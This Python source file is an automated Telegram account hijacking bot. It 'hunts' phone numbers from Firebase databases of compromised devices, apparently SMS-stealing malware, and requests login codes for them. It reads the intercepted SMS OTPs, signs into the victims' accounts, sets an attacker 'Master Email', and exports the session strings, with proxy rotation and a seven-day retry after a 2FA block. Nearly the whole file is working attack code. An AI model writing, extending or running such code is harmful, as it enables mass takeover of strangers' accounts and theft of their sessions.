import asyncio
import logging
import time
import random
import traceback
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded, FloodWait, PhoneCodeInvalid, RPCError
import config
import database as db
from services.warp_manager import get_warp_proxy, start_warp
import firebase_utils as fbu

log = logging.getLogger("TGAuto")
_WARP_READY = False

async def ensure_warp():
    global _WARP_READY
    if not _WARP_READY:
        _WARP_READY = await start_warp()
    return _WARP_READY

# 🚨 NEW: Pehle check karo ki number URL me hai ya nahi
async def check_number_in_firebase(phone_number):
    clean_phone = ''.join(filter(str.isdigit, phone_number))[-10:]
    d = db.load_data()
    fbs = d.get("firebases", [])
    
    for fb in fbs[:5]:
        try:
            clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
            if not clients or not isinstance(clients, dict): continue
            
            for dev_id, c in clients.items():
                if not isinstance(c, dict): continue
                if c.get("status") is True:
                    best_nums = fbu.extract_best_numbers(c, [])
                    if best_nums and best_nums[0][0] == clean_phone:
                        log.info(f"✅ Number {phone_number} found in Firebase URL.")
                        return True
        except:
            pass
    return False

# 🚨 Firebase URL se OTP dhundhne ka function (with timeout)
async def wait_for_firebase_otp(phone_number, timeout=60):
    start_time = time.time()
    clean_phone = ''.join(filter(str.isdigit, phone_number))[-10:]
    
    while time.time() - start_time < timeout:
        try:
            d = db.load_data()
            fbs = d.get("firebases", [])
            
            for fb in fbs[:5]:
                clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
                if not clients or not isinstance(clients, dict): continue
                
                for dev_id, c in clients.items():
                    if not isinstance(c, dict): continue
                    if c.get("status") is not True: continue
                    
                    best_nums = fbu.extract_best_numbers(c, [])
                    if not best_nums: continue
                    
                    if best_nums[0][0] == clean_phone:
                        msgs = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=5", fb.get("auth"))
                        if not msgs: continue
                        
                        for m in msgs.values():
                            if not isinstance(m, dict): continue
                            if m.get("type") != "incoming": continue
                            
                            text = m.get("message", "")
                            if "telegram" in text.lower():
                                otp = fbu.extract_otp(text)
                                if otp:
                                    log.info(f"Found SMS OTP from Firebase: {otp}")
                                    return otp
        except Exception as e:
            log.error(f"Firebase OTP error: {e}")
        
        await asyncio.sleep(3)
    return None

async def update_owner_progress(bot, text):
    try:
        await bot.send_message(config.MAIN_OWNER, f"🤖 <b>AI PROGRESS:</b>\n{text}", parse_mode="HTML")
    except:
        pass

async def auto_login_tg(bot, phone_number):
    log.info(f"Starting Auto-Login for {phone_number}")
    await update_owner_progress(bot, f"🔍 <b>Started Hunting:</b> <code>{phone_number}</code>")
    
    d = db.load_data()
    if not d.get("hunting_enabled", True):
        return {"status": "failed", "reason": "Hunting is disabled by Owner"}

    # 🚨 STEP 1: Check if number is in Firebase URL first
    await update_owner_progress(bot, f"📡 Checking if <code>{phone_number}</code> is online in Firebase URL...")
    is_in_url = await check_number_in_firebase(phone_number)
    
    if not is_in_url:
        await update_owner_progress(bot, f"❌ <b>Number NOT FOUND in URL!</b>\n<code>{phone_number}</code> kisi bhi online device me nahi hai. Timeout/waste nahi kiya. Skipping.")
        return {"status": "failed", "reason": "Number not found in Firebase URL (Device offline or not connected)."}

    await update_owner_progress(bot, f"✅ <b>Number found!</b> Ab WARP connect kar raha hu...")

    # Proxy Setup
    proxy_dict = None
    if await ensure_warp():
        proxy_dict = get_warp_proxy()
    
    if not proxy_dict:
        proxies = d.get("working_proxies", [])
        if proxies:
            p = random.choice(proxies)
            ip, port = p.split(":")[:2]
            proxy_dict = {"scheme": "socks5", "hostname": ip, "port": int(port)}

    app = Client(
        name=f"temp_{phone_number.replace('+', '')}",
        api_id=config.TG_API_ID,
        api_hash=config.TG_API_HASH,
        phone_number=phone_number,
        in_memory=True,
        proxy=proxy_dict
    )

    try:
        await app.connect()
        await update_owner_progress(bot, f"📡 Connected to Telegram. Sending OTP request...")
        
        try:
            sent_code = await app.send_code(phone_number)
        except FloodWait as e:
            await app.disconnect()
            return {"status": "failed", "reason": f"FloodWait: {e.value}s"}
            
        await update_owner_progress(bot, f"⏳ OTP Request Sent! Wait 60s for SMS (Firebase URL)...")
        
        # 🚨 Sirf Firebase se OTP dhundho
        otp = await wait_for_firebase_otp(phone_number, timeout=60)
        
        if not otp:
            await app.disconnect()
            return {"status": "failed", "reason": "SMS OTP timeout (60s me Firebase URL pe OTP nahi aaya)."}

        await update_owner_progress(bot, f"🔑 <b>OTP Mila (SMS):</b> <code>{otp}</code>\n🔐 Login kar raha hu...")
        
        try:
            await app.sign_in(phone_number, sent_code.phone_code_hash, otp)
        except SessionPasswordNeeded:
            await app.disconnect()
            return {"status": "failed", "reason": "2FA Password Enabled (Manual intervention needed)"}
        except PhoneCodeInvalid:
            await app.disconnect()
            return {"status": "failed", "reason": "Invalid OTP"}

        # Login successful! Master Email set karo
        await update_owner_progress(bot, f"✅ <b>Login Successful!</b>\nAb Master Email laga raha hu...")
        
        try:
            await app.update_profile(email=config.MASTER_EMAIL)
            log.info(f"Master Email set for {phone_number}")
            await update_owner_progress(bot, f"🔒 <b>Master Email Set!</b> ({config.MASTER_EMAIL})\nAccount is now protected.")
        except Exception as email_err:
            log.warning(f"Could not set email: {email_err}")

        session_string = await app.export_session_string()
        await app.disconnect()

        return {"status": "success", "session": session_string, "phone": phone_number}

    except Exception as e:
        error_details = traceback.format_exc()
        log.error(f"Login failed:\n{error_details}")
        if app.is_connected: 
            await app.disconnect()
        return {"status": "failed", "reason": str(e)}

async def reset_watchdog_loop(bot):
    while True:
        d = db.load_data()
        if not d.get("hunting_enabled", True):
            await asyncio.sleep(3600)
            continue
            
        tg_accounts = d.get("telegram_accounts", {})
        now = int(time.time())
        updated = False
        
        for phone, acc in tg_accounts.items():
            if acc.get("status") == "waiting_7_days":
                if now >= acc.get("reset_time", 0):
                    await update_owner_progress(bot, f"🕒 <b>7 Days Complete!</b>\n{phone} ka timer khatam. Re-login try kar raha hu...")
                    res = await auto_login_tg(bot, phone)
                    if res["status"] == "success":
                        acc["session"] = res["session"]
                        acc["status"] = "active"
                    else:
                        acc["status"] = "failed"
                        acc["reason"] = res["reason"]
                    updated = True
        
        if updated: db.save_data(d)
        await asyncio.sleep(3600)

async def auto_hunter_loop(bot):
    log.info("Auto-Hunter Background Loop Started...")
    while True:
        try:
            d = db.load_data()
            if not d.get("hunting_enabled", True):
                await asyncio.sleep(60)
                continue

            fbs = d.get("firebases", [])
            if not fbs:
                await asyncio.sleep(60)
                continue

            found_number = None
            for fb in fbs[:5]:
                clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
                if not clients or not isinstance(clients, dict): continue

                for dev_id, c in clients.items():
                    if not isinstance(c, dict): continue
                    if c.get("status") is True:
                        best_nums = fbu.extract_best_numbers(c, [])
                        if best_nums:
                            found_number = best_nums[0][0]
                            break
                if found_number: break

            if found_number:
                tg_accounts = d.get("telegram_accounts", {})
                if f"+91{found_number}" in tg_accounts:
                    await asyncio.sleep(30)
                    continue

                res = await auto_login_tg(bot, f"+91{found_number}")
                
                d = db.load_data()
                if res["status"] == "success":
                    d["telegram_accounts"][f"+91{found_number}"] = {"status": "active", "session": res["session"], "reset_time": 0}
                elif "2FA" in res.get("reason", ""):
                    reset_time = int(time.time()) + (7 * 24 * 3600)
                    d["telegram_accounts"][f"+91{found_number}"] = {"status": "waiting_7_days", "session": "", "reset_time": reset_time}
                else:
                    d["telegram_accounts"][f"+91{found_number}"] = {"status": "failed", "reason": res.get("reason", "Unknown")}
                
                db.save_data(d)

            await asyncio.sleep(120)
        except Exception as e:
            log.error(f"Auto-Hunter Error: {e}")
            await asyncio.sleep(60)
